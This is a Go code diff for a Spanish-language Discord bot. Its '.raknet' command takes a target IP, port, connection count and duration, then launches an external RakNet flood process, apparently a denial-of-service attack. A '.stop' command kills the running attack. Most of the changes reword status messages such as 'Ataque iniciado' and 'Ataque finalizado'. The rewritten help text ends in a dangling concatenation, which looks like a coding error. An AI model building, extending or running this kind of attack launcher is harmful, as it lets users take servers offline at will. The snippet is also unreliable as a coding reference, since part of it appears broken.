@@ -7,7 +7,6 @@ import (
 	"strconv"
 	"strings"
 	"sync"
-	"time"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -71,12 +70,12 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 	defer processMutex.Unlock()
 
 	if isRunning {
-		s.ChannelMessageSend(m.ChannelID, "Usa el comando .stop para hacer otro ataque")
+		s.ChannelMessageSend(m.ChannelID, "Ya hay un ataque run")
 		return
 	}
 
 	if len(args) < 4 {
-		s.ChannelMessageSend(m.ChannelID, "Completa todos los campos: `.raknet <ip> <puerto> <conexiones> <tiempo_segundos>`")
+		s.ChannelMessageSend(m.ChannelID, "Ponga bien la ip, port, conexions(10000), tiempo`")
 		return
 	}
 
@@ -87,17 +86,17 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 
 	// Validar parámetros
 	if !isValidIP(ip) {
-		s.ChannelMessageSend(m.ChannelID, "La ip no es valida")
+		s.ChannelMessageSend(m.ChannelID, "IP no valida")
 		return
 	}
 
 	if !isValidPort(port) {
-		s.ChannelMessageSend(m.ChannelID, "El puerto no es valido")
+		s.ChannelMessageSend(m.ChannelID, "Puerto no valido")
 		return
 	}
 
 	if !isValidNumber(connections) {
-		s.ChannelMessageSend(m.ChannelID, "Max conexiones 10000 creo")
+		s.ChannelMessageSend(m.ChannelID, "Conexiones no valido")
 		return
 	}
 
@@ -112,7 +111,7 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 		
 		err := cmd.Start()
 		if err != nil {
-			s.ChannelMessageSend(m.ChannelID, "`Error raknet.go`")
+			s.ChannelMessageSend(m.ChannelID, "Error raknet.go")
 			return
 		}
 
@@ -121,7 +120,7 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 		isRunning = true
 		processMutex.Unlock()
 
-		s.ChannelMessageSend(m.ChannelID, "Ataque iniciado!")
+		s.ChannelMessageSend(m.ChannelID, "Ataque iniciado")
 
 		err = cmd.Wait()
 		
@@ -131,9 +130,9 @@ func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args 
 		processMutex.Unlock()
 
 		if err != nil {
-			s.ChannelMessageSend(m.ChannelID, "`Error raknet.go`")
+			s.ChannelMessageSend(m.ChannelID, "Error raknet.go")
 		} else {
-			s.ChannelMessageSend(m.ChannelID, "`Ataque finalizado`")
+			s.ChannelMessageSend(m.ChannelID, "Ataque finalizado")
 		}
 	}()
 }
@@ -143,26 +142,26 @@ func handleStopCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
 	defer processMutex.Unlock()
 
 	if !isRunning || attackProcess == nil {
-		s.ChannelMessageSend(m.ChannelID, "No hay ataque run")
+		s.ChannelMessageSend(m.ChannelID, "No hay un ataque en run")
 		return
 	}
 
 	err := attackProcess.Kill()
 	if err != nil {
-		s.ChannelMessageSend(m.ChannelID, "Error no se pudo detener")
+		s.ChannelMessageSend(m.ChannelID, "Error al detener")
 		return
 	}
 
 	isRunning = false
 	attackProcess = nil
-	s.ChannelMessageSend(m.ChannelID, "Ataque detenido!")
+	s.ChannelMessageSend(m.ChannelID, "Ataque detenido")
 }
 
 func handleHelpCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
-	helpMsg := `**Comandos disponibles:**
-.raknet 1.1.1.1 80 10000 32
-.stop - Parar el ataque
-.help - Muestra esta ayuda
+	helpMsg := "**Comandos disponibles:**\n" +
+		".raknet <ip> <puerto> <conexiones(10000)> <segundos>\n" +
+		".stop - Detiene los atques\n" +
+		".help - Muestra esta ayuda\n\n" +
 
 	s.ChannelMessageSend(m.ChannelID, helpMsg)
 }
